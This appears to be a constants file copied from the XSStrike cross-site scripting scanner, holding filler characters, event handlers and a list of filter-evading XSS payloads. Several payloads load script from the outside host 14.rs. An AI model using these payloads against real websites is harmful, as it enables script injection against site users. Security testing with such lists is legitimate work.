"""Extracted from s0md3v/XSStrike core/config.py — 1:1 constants."""

XSSCHECKER = 'v3dm0s'
MIN_EFFICIENCY = 90
SPECIAL_ATTRIBUTES = ['srcdoc', 'src']
BAD_TAGS = ('iframe', 'title', 'textarea', 'noembed', 'style', 'template', 'noscript')
TAGS = ('html', 'd3v', 'a', 'details')
J_FILLINGS = ';'
L_FILLINGS = ('', '%0dx')
E_FILLINGS = ('%09', '%0a', '%0d', '+')
FILLINGS = ('%09', '%0a', '%0d', '/+/')
EVENT_HANDLERS = {'ontoggle': ['details'], 'onpointerenter': ['d3v', 'details', 'html', 'a'], 'onmouseover': ['a', 'html', 'd3v']}
FUNCTIONS = ('[8].find(confirm)', 'confirm()', '(confirm)()', 'confirm()', '(prompt)``', 'a=prompt,a()')
PAYLOADS = ('\'"</Script><Html Onmouseover=(confirm)()//<imG/sRc=l oNerrOr=(prompt)() x>', '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>', '<deTails open oNToggle=confirm()>', '<img sRc=l oNerrOr=(confirm)() x>', '<svg/x=">"/onload=confirm()//', '<svg%0Aonload=%09((prompt))()//', '<iMg sRc=x:confirm`` oNlOad=eval(src)>', '<sCript x>confirm``</scRipt x>', '<Script x>prompt()</scRiPt x>', '<sCriPt sRc=//14.rs>', '<embed//sRc=//14.rs>', '<base href=//14.rs/><script src=/>', '<object//data=//14.rs>', '<s=" onclick=confirm``>clickme', '<svG oNLoad=confirm&#x28;1&#x29>', '\'"><y///oNMousEDown=((confirm))()>Click', '<a/href=javascript&colon;confirm&#40;&quot;1&quot;&#41;>clickme</a>', '<img src=x onerror=confirm`1`>', '<svg/onload=confirm`1`>')
